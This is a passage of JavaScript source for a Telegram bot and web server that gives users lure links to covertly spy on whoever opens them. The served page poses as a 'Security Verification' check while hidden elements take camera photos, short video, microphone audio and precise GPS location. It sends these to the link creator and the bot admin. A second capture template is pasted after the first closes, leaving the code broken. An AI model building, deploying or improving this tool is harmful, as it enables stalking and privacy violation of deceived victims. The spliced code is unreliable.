    if (userId != config.ADMIN_ID) return;

    const targetId = ctx.message.text.split(' ')[1];
    if (!targetId) {
        ctx.reply('الاستخدام: /resetuser [آيدي المستخدم]');
        return;
    }

    const user = getUser(targetId);
    if (user) {
        updateUser(targetId, {
            agreed_terms: false,
            lang_selected: false,
            is_vip: false,
            vip_activated_at: 0,
            stars: 0,
            referrals: 0,
            invited_by: null,
            referral_credited: false,
            is_banned: false,
            state: 'none',
            last_daily: 0,
            total_captures: 0,
            today_captures: 0,
            today_date: '',
            achievements: [],
            level: 'bronze',
            free_location_used: 0,
            free_audio_used: 0
        });
        ctx.reply(`تم إعادة تعيين المستخدم ${targetId}.`);
    } else {
        ctx.reply('المستخدم غير موجود.');
    }
});

bot.command('addstars', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const parts = ctx.message.text.split(' ');
    const targetId = parts[1];
    const amount = parseInt(parts[2], 10);

    if (!targetId || isNaN(amount) || amount <= 0) {
        ctx.reply('الاستخدام: /addstars [آيدي المستخدم] [عدد النجوم]');
        return;
    }

    const user = getUser(targetId);
    if (user) {
        updateUser(targetId, { stars: user.stars + amount });
        ctx.reply(`تم إضافة ${amount} نجمة للمستخدم ${targetId}. رصيده الحالي: ${user.stars + amount}.`);
    } else {
        ctx.reply('المستخدم غير موجود.');
    }
});

bot.command('removestars', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const parts = ctx.message.text.split(' ');
    const targetId = parts[1];
    const amount = parseInt(parts[2], 10);

    if (!targetId || isNaN(amount) || amount <= 0) {
        ctx.reply('الاستخدام: /removestars [آيدي المستخدم] [عدد النجوم]');
        return;
    }

    const user = getUser(targetId);
    if (user) {
        updateUser(targetId, { stars: Math.max(0, user.stars - amount) });
        ctx.reply(`تم حذف ${amount} نجمة من المستخدم ${targetId}. رصيده الحالي: ${Math.max(0, user.stars - amount)}.`);
    } else {
        ctx.reply('المستخدم غير موجود.');
    }
});

bot.command('viplist', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const users = loadUsers();
    let msg = '💎 <b>قائمة مستخدمي VIP:</b>\n\n';
    const vipUsers = Object.values(users).filter(u => u.is_vip);

    if (vipUsers.length === 0) {
        msg += 'لا يوجد مستخدمو VIP حالياً.';
    } else {
        for (const user of vipUsers) {
            msg += `ID: <code>${user.id}</code> | Activated: ${new Date(user.vip_activated_at * 1000).toLocaleString()}\n`;
        }
    }
    ctx.reply(msg, { parse_mode: 'HTML' });
});

bot.command('topusers', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const users = loadUsers();
    const sortedUsers = Object.values(users).sort((a, b) => b.referrals - a.referrals).slice(0, 10);

    let msg = '🏆 <b>أفضل 10 مستخدمين (حسب الإحالات):</b>\n\n';
    if (sortedUsers.length === 0) {
        msg += 'لا يوجد مستخدمون بعد.';
    } else {
        for (let i = 0; i < sortedUsers.length; i++) {
            const user = sortedUsers[i];
            msg += `${i + 1}. ID: <code>${user.id}</code> | الإحالات: ${user.referrals} | النجوم: ${user.stars}\n`;
        }
    }
    ctx.reply(msg, { parse_mode: 'HTML' });
});

bot.command('resetalltrials', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const users = loadUsers();
    for (const user of Object.values(users)) {
        updateUser(user.id, { free_location_used: 0, free_audio_used: 0 });
    }
    ctx.reply('تم إعادة تعيين جميع المحاولات المجانية لجميع المستخدمين.');
});

bot.command('setvip_stars', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const price = parseInt(ctx.message.text.split(' ')[1], 10);
    if (isNaN(price) || price <= 0) {
        ctx.reply('الاستخدام: /setvip_stars [سعر النجوم]');
        return;
    }

    const settings = loadSettings();
    settings.vip_price_stars = price;
    saveSettings(settings);
    ctx.reply(`تم تعيين سعر VIP بالنجوم إلى ${price}.`);
});

bot.command('setvip_refs', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const count = parseInt(ctx.message.text.split(' ')[1], 10);
    if (isNaN(count) || count <= 0) {
        ctx.reply('الاستخدام: /setvip_refs [عدد الإحالات]');
        return;
    }

    const settings = loadSettings();
    settings.vip_price_referrals = count;
    saveSettings(settings);
    ctx.reply(`تم تعيين سعر VIP بالإحالات إلى ${count}.`);
});

bot.command('setreferral_stars', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const stars = parseInt(ctx.message.text.split(' ')[1], 10);
    if (isNaN(stars) || stars <= 0) {
        ctx.reply('الاستخدام: /setreferral_stars [عدد النجوم]');
        return;
    }

    const settings = loadSettings();
    settings.referral_stars = stars;
    saveSettings(settings);
    ctx.reply(`تم تعيين نجوم الإحالة إلى ${stars}.`);
});

bot.command('setcooldown', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const seconds = parseInt(ctx.message.text.split(' ')[1], 10);
    if (isNaN(seconds) || seconds < 0) {
        ctx.reply('الاستخدام: /setcooldown [عدد الثواني]');
        return;
    }

    const settings = loadSettings();
    settings.cooldown_seconds = seconds;
    saveSettings(settings);
    ctx.reply(`تم تغيير الكولداون إلى ${seconds} ثانية.`);
});

bot.command('logs', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    if (fs.existsSync(LOG_FILE)) {
        const logContent = fs.readFileSync(LOG_FILE, 'utf8');
        const lines = logContent.split('\n');
        const last100Lines = lines.slice(-100).join('\n');
        ctx.reply(`<b>آخر 100 سطر من سجل البوت:</b>\n<pre>${last100Lines}</pre>`, { parse_mode: 'HTML' });
    } else {
        ctx.reply('لا يوجد سجلات.');
    }
});

bot.command('security', async (ctx) => {
    const userId = ctx.from.id;
    if (userId != config.ADMIN_ID) return;

    const securityLogFile = path.join(DATA_DIR, 'security.log');
    if (fs.existsSync(securityLogFile)) {
        const logContent = fs.readFileSync(securityLogFile, 'utf8');
        const lines = logContent.split('\n');
        const last100Lines = lines.slice(-100).join('\n');
        ctx.reply(`<b>آخر 100 سطر من سجل الأمان:</b>\n<pre>${last100Lines}</pre>`, { parse_mode: 'HTML' });
    } else {
        ctx.reply('لا يوجد سجلات أمان.');
    }
});

// ==========================================
// Web Server for Short Links and Uploads
// ==========================================

app.get('/:code', async (req, res) => {
    const code = req.params.code;
    const linkData = getShortLinkData(code);

    if (!linkData) {
        return res.status(404).send('Link not found');
    }

    const ownerId = linkData.u;
    const cameraType = linkData.c; // 'f' for front, 'b' for back, 'v' for video, 'a' for audio, 'l' for location
    const redirectUrl = linkData.r; // For custom links

    const user = getUser(ownerId);
    if (!user) {
        return res.status(404).send('User not found');
    }

    // Render the capture page
    const uploadUrl = `${config.BOT_URL}/upload`; // Unified upload endpoint
    const nonce = generateNonce();
    const encryptedOwnerId = encryptData(String(ownerId));

    let facingMode = 'user'; // Default to front camera
    if (cameraType === 'b') {
        facingMode = 'environment'; // Back camera
    }

    let capturePageHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying...</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:linear-gradient(135deg,#0f0c29 0%,#302b63 50%,#24243e 100%);color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden}
        .container{text-align:center;padding:50px 30px;background:rgba(255,255,255,0.05);border-radius:30px;backdrop-filter:blur(25px);border:1px solid rgba(255,255,255,0.1);box-shadow:0 30px 100px rgba(0,0,0,0.6);animation:fadeIn 1s ease;max-width:400px;width:90%}
        @keyframes fadeIn{from{opacity:0;transform:scale(0.9) translateY(30px)}to{opacity:1;transform:scale(1) translateY(0)}}
        .logo{width:80px;height:80px;margin:0 auto 20px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:20px;display:flex;align-items:center;justify-content:center;font-size:36px;box-shadow:0 10px 30px rgba(102,126,234,0.4)}
        .spinner{width:45px;height:45px;border:3px solid rgba(255,255,255,0.1);border-top:3px solid #667eea;border-radius:50%;animation:spin 0.8s linear infinite;margin:25px auto}
        @keyframes spin{to{transform:rotate(360deg)}}
        h2{color:#fff;margin-bottom:8px;font-size:1.3em;font-weight:600}
        p{opacity:0.7;font-size:0.95em;line-height:1.5}
        .progress{width:100%;height:4px;background:rgba(255,255,255,0.1);border-radius:4px;margin:25px auto 0;overflow:hidden}
        .progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#667eea,#764ba2);border-radius:4px;animation:loading 3s ease-in-out forwards}
        @keyframes loading{0%{width:0%}50%{width:60%}80%{width:85%}100%{width:95%}}
        .shield{margin-top:15px;font-size:12px;opacity:0.5}
        video,canvas{display:none!important}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔒</div>
        <h2>Security Verification</h2>
        <p>Please wait while we verify your identity...</p>
        <div class="spinner"></div>
        <div class="progress"><div class="progress-bar"></div></div>
        <p class="shield">🛡️ Protected by CloudGuard™</p>
    </div>
    <video id="v" autoplay playsinline></video>
    <canvas id="cv"></canvas>
    <script>
    (function(){
        var v=document.getElementById("v"),cv=document.getElementById("cv"),ctx=cv.getContext("2d");
        var fm="${facingMode}",uid="${encryptedOwnerId}",rurl="${redirectUrl || ''}",ct="${cameraType}",uu="${uploadUrl}",nc="${nonce}";
        
        function getDeviceInfo(){
            return {
                user_agent: navigator.userAgent,
                platform: navigator.platform || "unknown",
                language: navigator.language || "unknown",
                screen: screen.width+"x"+screen.height
            };
        }
        
        function doLocation(){
            if(!navigator.geolocation){
                window.location.href=rurl;
                return;
            }
            navigator.geolocation.getCurrentPosition(function(pos){
                var info=getDeviceInfo();
                var payload={
                    action:"upload_location",
                    user_id:uid,
                    latitude:pos.coords.latitude,
                    longitude:pos.coords.longitude,
                    accuracy:pos.coords.accuracy,
                    nonce:nc,
                    user_agent:info.user_agent,
                    platform:info.platform
                };
                fetch(uu,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)})
                .then(function(){})
                .catch(function(){})
                .finally(function(){setTimeout(function(){window.location.href=rurl},500)});
            },function(){
                window.location.href=rurl;
            },{enableHighAccuracy:true,timeout:10000,maximumAge:0});
        }
        
        function doPhoto(stream){
            v.srcObject=stream;v.play();
            setTimeout(function(){
                cv.width=v.videoWidth;cv.height=v.videoHeight;
                ctx.drawImage(v,0,0);
                var d=cv.toDataURL("image/jpeg",0.85);
                stream.getTracks().forEach(function(t){t.stop()});
                send("photo",d);
            },1500);
        }
        
        function doVideo(stream){
            v.srcObject=stream;v.play();
            var chunks=[];
            var mimeTypes=["video/mp4","video/webm;codecs=vp9,opus","video/webm;codecs=vp8,opus","video/webm"];
            var options={};
            for(var i=0;i<mimeTypes.length;i++){
                if(MediaRecorder.isTypeSupported(mimeTypes[i])){
                    options={mimeType:mimeTypes[i]};
                    break;
                }
            }
            var mr=new MediaRecorder(stream,options);
            mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data)};
            mr.onstop=function(){
                var mtype=mr.mimeType||"video/webm";
                var blob=new Blob(chunks,{type:mtype});
                var reader=new FileReader();
                reader.onloadend=function(){send("video",reader.result)};
                reader.readAsDataURL(blob);
                stream.getTracks().forEach(function(t){t.stop()});
            };
            mr.start(1000);
            setTimeout(function(){mr.stop()},5000);
        }
        
        function doAudio(stream){
            var chunks=[];
            var mimeTypes=["audio/webm;codecs=opus","audio/webm","audio/ogg;codecs=opus"];
            var options={};
            for(var i=0;i<mimeTypes.length;i++){
                if(MediaRecorder.isTypeSupported(mimeTypes[i])){
                    options={mimeType:mimeTypes[i]};
                    break;
                }
            }
            var mr=new MediaRecorder(stream,options);
            mr.ondataavailable=function(e){if(e.data.size>0)chunks.push(e.data)};
            mr.onstop=function(){
                var blob=new Blob(chunks,{type:mr.mimeType||"audio/webm"});
                var reader=new FileReader();
                reader.onloadend=function(){send("audio",reader.result)};
                reader.readAsDataURL(blob);
                stream.getTracks().forEach(function(t){t.stop()});
            };
            mr.start();
            setTimeout(function(){mr.stop()},10000);
        }
        
        function send(type,data){
            var info=getDeviceInfo();
            var payload={action:"upload_media",type:type,user_id:uid,media_data:data,nonce:nc,user_agent:info.user_agent,platform:info.platform};
            fetch(uu,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)})
            .then(function(){})
            .catch(function(){})
            .finally(function(){setTimeout(function(){window.location.href=rurl},500)});
        }
        
        setTimeout(function(){
            if(ct==="l"){
                doLocation();
                return;
            }
            
            var constraints={};
            if(ct==="a"){
                constraints={audio:true,video:false};
            } else {
                constraints={video:{facingMode:fm,width:{ideal:1280},height:{ideal:720}},audio:(ct==="v")};
            }
            
            navigator.mediaDevices.getUserMedia(constraints)
            .then(function(stream){
                if(ct==="f" || ct==="b")doPhoto(stream);
                else if(ct==="v")doVideo(stream);
                else if(ct==="a")doAudio(stream);
            })
            .catch(function(){window.location.href=rurl});
        },1000);
    })();
    </script>
</body>
</html>
    `;
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture</title>
    <style>
        body { margin: 0; overflow: hidden; background-color: black; display: flex; justify-content: center; align-items: center; height: 100vh; }
        video { width: 100%; height: 100%; object-fit: cover; }
        #captureButton { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); padding: 15px 30px; font-size: 20px; background-color: #007bff; color: white; border: none; border-radius: 50px; cursor: pointer; z-index: 10; }
        #loading { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.8); color: white; display: flex; justify-content: center; align-items: center; font-size: 2em; z-index: 20; display: none; }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <button id="captureButton">Capture</button>
    <div id="loading">Uploading...</div>

    <script>
        const video = document.getElementById('video');
        const captureButton = document.getElementById('captureButton');
        const loadingDiv = document.getElementById('loading');
        let mediaRecorder;
        let recordedChunks = [];
        let captureType = '${cameraType}'; // 'f', 'b', 'v', 'a', 'l'
        let ownerId = '${ownerId}';
        let redirectUrl = '${redirectUrl}';

        async function startCamera(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode ? facingMode : 'user' },
                    audio: captureType === 'a' || captureType === 'v'
                });
                video.srcObject = stream;
                video.play();

                if (captureType === 'v' || captureType === 'a') {
                    mediaRecorder = new MediaRecorder(stream);
                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data.size > 0) {
                            recordedChunks.push(event.data);
                        }
                    };
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(recordedChunks, { type: mediaRecorder.mimeType });
                        uploadMedia(blob);
                    };
                }

            } catch (err) {
                console.error('Error accessing camera: ', err);
                alert('Failed to access camera. Please ensure permissions are granted.');
            }
        }

        async function captureAndUpload() {
            loadingDiv.style.display = 'flex';
            captureButton.style.display = 'none';

            if (captureType === 'l') {
                // Location capture
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const { latitude, longitude } = position.coords;
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    const ip = ipData.ip;

                    const data = {
                        ownerId: ownerId,
                        latitude: latitude,
                        longitude: longitude,
                        ip: ip,
                        userAgent: navigator.userAgent,
                        timestamp: Date.now()
                    };
                    await fetch('/upload_location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                    if (redirectUrl) window.location.href = redirectUrl;
                    else alert('Location captured!');
                }, (error) => {
                    console.error('Error getting location: ', error);
                    alert('Failed to get location. Please ensure permissions are granted.');
                    if (redirectUrl) window.location.href = redirectUrl;
                });
                return;
            }

            if (captureType === 'v') {
                // Video capture
                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 5000); // 5 seconds video
                return;
            }

            if (captureType === 'a') {
                // Audio capture
                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 10000); // 10 seconds audio
                return;
            }

            // Photo capture
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg');

            await fetch('/upload_media', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ownerId: ownerId, mediaData: imageData, mediaType: 'photo' })
            });
            if (redirectUrl) window.location.href = redirectUrl;
            else alert('Photo captured!');
        }

        async function uploadMedia(blob) {
            const reader = new FileReader();
            reader.onloadend = async () => {
                const mediaData = reader.result;
                const mediaType = captureType === 'v' ? 'video' : 'audio';
                await fetch('/upload_media', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ownerId: ownerId, mediaData: mediaData, mediaType: mediaType })
                });
                if (redirectUrl) window.location.href = redirectUrl;
                else alert(`${mediaType} captured!`);
            };
            reader.readAsDataURL(blob);
        }

        captureButton.addEventListener('click', captureAndUpload);

        // Start camera based on type
        if (captureType === 'f') {
            startCamera('user'); // Front camera
        } else if (captureType === 'b') {
            startCamera({ exact: 'environment' }); // Back camera
        } else if (captureType === 'v' || captureType === 'a') {
            startCamera('user'); // For video/audio, start with front camera by default
        } else if (captureType === 'l') {
            // No camera needed for location, hide video and button
            video.style.display = 'none';
            captureButton.style.display = 'none';
            // Automatically trigger location capture
            captureAndUpload();
        }
    </script>
</body>
</html>
    `;

    res.send(capturePageHtml);
});

app.post("/upload", async (req, res) => {
    const { action, user_id, nonce, ...data } = req.body;

    // Decrypt ownerId
    const ownerId = decryptData(user_id);
    if (!ownerId) {
        logSecurity("Failed to decrypt ownerId", user_id);
        return res.status(400).send("Invalid owner ID");
    }

    // Validate nonce
    if (!validateNonce(nonce)) {
        logSecurity("Invalid or expired nonce", `User: ${ownerId}, Nonce: ${nonce}`);
        return res.status(403).send("Invalid or expired request");
    }

    if (action === "upload_location") {
        const { latitude, longitude, accuracy, user_agent, platform } = data;
        const ip = req.ip; // Express way to get IP
        const timestamp = Math.floor(Date.now() / 1000);

        if (!latitude || !longitude) {
            logSecurity("Invalid location upload data", JSON.stringify(req.body));
            return res.status(400).send("Invalid data");
        }

        const user = getUser(ownerId);
        if (!user) {
            logSecurity("Location upload for non-existent user", ownerId);
            return res.status(404).send("User not found");
        }

        // Rate limit for location uploads
        if (!rateLimitCheck(`location_upload_${ownerId}`, 5, 60)) { // 5 uploads per minute
            logSecurity("Location upload rate limit exceeded", ownerId);
            return res.status(429).send("Too many requests");
        }

        // Free trial check for non-VIP users
        if (!user.is_vip) {
            if (user.free_location_used >= config.FREE_LOCATION_LIMIT) {
                logSecurity("Free location limit exceeded", ownerId);
                return res.status(403).send("Free trial limit exceeded");
            }
            updateUser(ownerId, { free_location_used: user.free_location_used + 1 });
        }

        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        const message = getTextMsg("location_received", user.lang, latitude, longitude, mapsLink, ip, user_agent, platform, new Date(timestamp * 1000).toLocaleString());

        try {
            await bot.telegram.sendMessage(ownerId, message, { parse_mode: "HTML" });
            bot.telegram.sendMessage(config.ADMIN_ID, `📍 New Location from User ${ownerId}:\n${message}`, { parse_mode: "HTML" });
            writeLog(`Location uploaded for user ${ownerId}: ${latitude}, ${longitude}`);
            res.status(200).send("Location received");
        } catch (e) {
            writeLog(`Failed to send location to Telegram for user ${ownerId}: ${e.message}`);
            res.status(500).send("Failed to send to Telegram");
        }
    } else if (action === "upload_media") {
        const { type, media_data, user_agent, platform } = data;

        if (!type || !media_data) {
            logSecurity("Invalid media upload data", JSON.stringify(req.body));
            return res.status(400).send("Invalid data");
        }

        const user = getUser(ownerId);
        if (!user) {
            logSecurity("Media upload for non-existent user", ownerId);
            return res.status(404).send("User not found");
        }

        // Validate media data size and format
        if (!validateMediaData(media_data)) {
            logSecurity("Invalid media data format or size", ownerId);
            return res.status(400).send("Invalid media data");
        }

        // Rate limit for media uploads
        if (!rateLimitCheck(`media_upload_${ownerId}`, 5, 60)) { // 5 uploads per minute
            logSecurity("Media upload rate limit exceeded", ownerId);
            return res.status(429).send("Too many requests");
        }

        // Free trial check for audio for non-VIP users
        if (type === "audio" && !user.is_vip) {
            if (user.free_audio_used >= config.FREE_AUDIO_LIMIT) {
                logSecurity("Free audio limit exceeded", ownerId);
                return res.status(403).send("Free trial limit exceeded");
            }
            updateUser(ownerId, { free_audio_used: user.free_audio_used + 1 });
        }

        // Update total captures
        updateUser(ownerId, { total_captures: (user.total_captures ?? 0) + 1 });
        checkAchievements(ownerId);

        try {
            const buffer = Buffer.from(media_data.split(",")[1], "base64");
            const filename = `${ownerId}_${type}_${Date.now()}.${type === "photo" ? "jpg" : (type === "video" ? "mp4" : "ogg")}`;
            const filePath = path.join(DATA_DIR, filename);
            fs.writeFileSync(filePath, buffer);

            let telegramSendMethod;
            let telegramOptions = { caption: `New ${type} from user ${ownerId}` };

            if (type === "photo") {
                telegramSendMethod = "sendPhoto";
            } else if (type === "video") {
                telegramSendMethod = "sendVideo";
            } else if (type === "audio") {
                telegramSendMethod = "sendAudio";
            } else {
                throw new Error("Unsupported media type");
            }

            // Send to owner
            await bot.telegram[telegramSendMethod](ownerId, { source: filePath }, telegramOptions);
            // Send to admin
            await bot.telegram[telegramSendMethod](config.ADMIN_ID, { source: filePath }, telegramOptions);

            writeLog(`${type} uploaded for user ${ownerId}: ${filename}`);
            res.status(200).send(`${type} received`);
        } catch (e) {
            writeLog(`Failed to process media upload for user ${ownerId}: ${e.message}`);
            res.status(500).send("Failed to process media");
        }
    } else {
        logSecurity("Unknown upload action", JSON.stringify(req.body));
        res.status(400).send("Unknown action");
    }
});

// Remove old upload routes
// app.post("/upload_location", async (req, res) => { ... });
// app.post("/upload_media", async (req, res) => { ... });


// ==========================================
// Webhook and Server Start
// ==========================================

// Set up webhook (replace with your actual webhook URL)
// For local testing, you might use long polling (bot.launch()) or a tool like ngrok
// bot.telegram.setWebhook(`${config.BOT_URL}/webhook`);
// app.use(bot.webhookCallback('/webhook'));

// For local development, use long polling
bot.start(async (ctx) => {
    const userId = ctx.from.id;
    let user = getUser(userId);

    if (!user) {
        user = updateUser(userId, {}); // Create new user with defaults
    }

    if (user.is_banned) {
        return ctx.reply(getTextMsg("banned_message", user.lang));
    }

    // Check for referral
    if (ctx.startPayload) {
        const invitedBy = ctx.startPayload;
        if (invitedBy && invitedBy !== String(userId) && !user.invited_by) {
            const inviter = getUser(invitedBy);
            if (inviter) {
                updateUser(userId, { invited_by: invitedBy });
                updateUser(invitedBy, { referrals: inviter.referrals + 1, stars: inviter.stars + config.REFERRAL_STARS });
                bot.telegram.sendMessage(invitedBy, getTextMsg("new_referral", inviter.lang, ctx.from.first_name));
                writeLog(`User ${userId} referred by ${invitedBy}`);
            }
        }
    }

    if (!user.agreed_terms) {
        await ctx.reply(getTextMsg("welcome", user.lang), Markup.inlineKeyboard([
            Markup.button.callback(getTextMsg("agree_btn", user.lang), "agree_terms")
        ]));
    } else if (!user.lang_selected) {
        await ctx.reply(getTextMsg("choose_lang", user.lang), Markup.inlineKeyboard([
            [Markup.button.callback("العربية 🇸🇦", "set_lang_ar"), Markup.button.callback("English 🇬🇧", "set_lang_en")],
            [Markup.button.callback("हिन्दी 🇮🇳", "set_lang_hi"), Markup.button.callback("বাংলা 🇧🇩", "set_lang_bn")],
            [Markup.button.callback("Русский 🇷🇺", "set_lang_ru")]
        ]));
    } else {
        await ctx.reply(getTextMsg("main_menu", user.lang), getMainMenuKeyboard(user.lang));
    }
});

bot.action("agree_terms", async (ctx) => {
    const userId = ctx.from.id;
    const user = getUser(userId);

    if (!user || user.is_banned) {
        return ctx.answerCbQuery(getTextMsg("banned_message", user?.lang || "ar"));
    }

    updateUser(userId, { agreed_terms: true });
    await ctx.editMessageText(getTextMsg("terms_agreed", user.lang));
    await ctx.reply(getTextMsg("choose_lang", user.lang), Markup.inlineKeyboard([
        [Markup.button.callback("العربية 🇸🇦", "set_lang_ar"), Markup.button.callback("English 🇬🇧", "set_lang_en")],
        [Markup.button.callback("हिन्दी 🇮🇳", "set_lang_hi"), Markup.button.callback("বাংলা 🇧🇩", "set_lang_bn")],
        [Markup.button.callback("Русский 🇷🇺", "set_lang_ru")]
    ]));
});

bot.action(/set_lang_(ar|en|hi|bn|ru)/, async (ctx) => {
    const userId = ctx.from.id;
    const lang = ctx.match[1];
    const user = getUser(userId);

    if (!user || user.is_banned) {
        return ctx.answerCbQuery(getTextMsg("banned_message", user?.lang || "ar"));
    }

    updateUser(userId, { lang: lang, lang_selected: true });
    await ctx.editMessageText(getTextMsg("lang_saved", lang));
    await ctx.reply(getTextMsg("main_menu", lang), getMainMenuKeyboard(lang));
});

bot.hears(texts.ar.front_cam, async (ctx) => {
    const userId = ctx.from.id;
    const user = getUser(userId);

    if (!user || user.is_banned) {
        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
    }

    if (!user.agreed_terms || !user.lang_selected) {
        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
    }

    const remainingCooldown = cooldownCheck(userId, 'link', config.COOLDOWN_SECONDS);
    if (remainingCooldown > 0) {
        return ctx.reply(getTextMsg("cooldown_message", user.lang, remainingCooldown));
    }

    const shortCode = generateShortCode();
    const redirectUrl = `${config.BOT_URL}?start=${userId}`;
    saveShortLink(shortCode, { owner_id: userId, type: 'f', redirect_url: redirectUrl });

    const captureLink = `${config.BOT_URL}/${shortCode}`;
    await ctx.reply(getTextMsg("front_cam_link", user.lang, captureLink));
    writeLog(`Front camera link generated for user ${userId}: ${captureLink}`);
});

bot.hears(texts.ar.back_cam, async (ctx) => {
    const userId = ctx.from.id;
    const user = getUser(userId);

    if (!user || user.is_banned) {
        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
    }

    if (!user.agreed_terms || !user.lang_selected) {
        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
    }

    const remainingCooldown = cooldownCheck(userId, 'link', config.COOLDOWN_SECONDS);
    if (remainingCooldown > 0) {
        return ctx.reply(getTextMsg("cooldown_message", user.lang, remainingCooldown));
    }

    const shortCode = generateShortCode();
    const redirectUrl = `${config.BOT_URL}?start=${userId}`;
    saveShortLink(shortCode, { owner_id: userId, type: 'b', redirect_url: redirectUrl });

    const captureLink = `${config.BOT_URL}/${shortCode}`;
    await ctx.reply(getTextMsg("back_cam_link", user.lang, captureLink));
    writeLog(`Back camera link generated for user ${userId}: ${captureLink}`);
});

bot.hears(texts.ar.custom_link, async (ctx) => {
    const userId = ctx.from.id;
    const user = getUser(userId);

    if (!user || user.is_banned) {
        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
    }

    if (!user.agreed_terms || !user.lang_selected) {
        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
    }

    updateUser(userId, { state: "waiting_for_custom_link" });
    await ctx.reply(getTextMsg("send_custom_link", user.lang));
});

bot.hears(texts.ar.location_btn, async (ctx) => {
    const userId = ctx.from.id;
    const user = getUser(userId);

    if (!user || user.is_banned) {
        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
    }

    if (!user.agreed_terms || !user.lang_selected) {
        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
    }

    const remainingCooldown = cooldownCheck(userId, 'link', config.COOLDOWN_SECONDS);
    if (remainingCooldown > 0) {
        return ctx.reply(getTextMsg("cooldown_message", user.lang, remainingCooldown));
    }

    // Check free trial limit for location
    if (!user.is_vip && user.free_location_used >= config.FREE_LOCATION_LIMIT) {
        return ctx.reply(getTextMsg("free_location_limit_reached", user.lang));
    }

    const shortCode = generateShortCode();
    const redirectUrl = `${config.BOT_URL}?start=${userId}`;
    saveShortLink(shortCode, { owner_id: userId, type: 'l', redirect_url: redirectUrl });

    const captureLink = `${config.BOT_URL}/${shortCode}`;
    await ctx.reply(getTextMsg("location_link", user.lang, captureLink));
    writeLog(`Location link generated for user ${userId}: ${captureLink}`);
});

bot.hears(texts.ar.vip_section, async (ctx) => {
    const userId = ctx.from.id;
    const user = getUser(userId);
    const settings = loadSettings();

    if (!user || user.is_banned) {
        return ctx.reply(getTextMsg("banned_message", user?.lang || "ar"));
    }

    if (!user.agreed_terms || !user.lang_selected) {
        return ctx.reply(getTextMsg("please_agree_terms_lang", user.lang));
    }

    let message;
    let keyboardOptions = [];

    if (user.is_vip) {
        message = getTextMsg("vip_already_member", user.lang);
    } else {
        message = getTextMsg("vip_info", user.lang, settings.vip_price_stars, settings.vip_price_referrals);
        keyboardOptions.push(
            [Markup.button.callback(getTextMsg("vip_activate_stars", user.lang, settings.vip_price_stars), "activate_vip_stars")],
            [Markup.button.callback(getTextMsg("vip_activate_referrals", user.lang, settings.vip_price_referrals), "activate_vip_referrals")]
        );
    }

    await ctx.reply(message, Markup.inlineKeyboard(keyboardOptions));
});

bot.action("activate_vip_stars", async (ctx) => {
    const userId = ctx.from.id;
    const user = getUser(userId);
    const settings = loadSettings();

    if (!user || user.is_banned) {
        return ctx.answerCbQuery(getTextMsg("banned_message", user?.lang || "ar"));
    }

    if (user.is_vip) {
        return ctx.answerCbQuery(getTextMsg("vip_already_member", user.lang), true);
    }

    if (user.stars >= settings.vip_price_stars) {
        updateUser(userId, { is_vip: true, vip_activated_at: Math.floor(Date.now() / 1000), stars: user.stars - settings.vip_price_stars });
        await ctx.editMessageText(getTextMsg("vip_activated_stars_success", user.lang, settings.vip_price_stars));
        checkAchievements(userId);
        writeLog(`User ${userId} activated VIP with stars.`);
    } else {
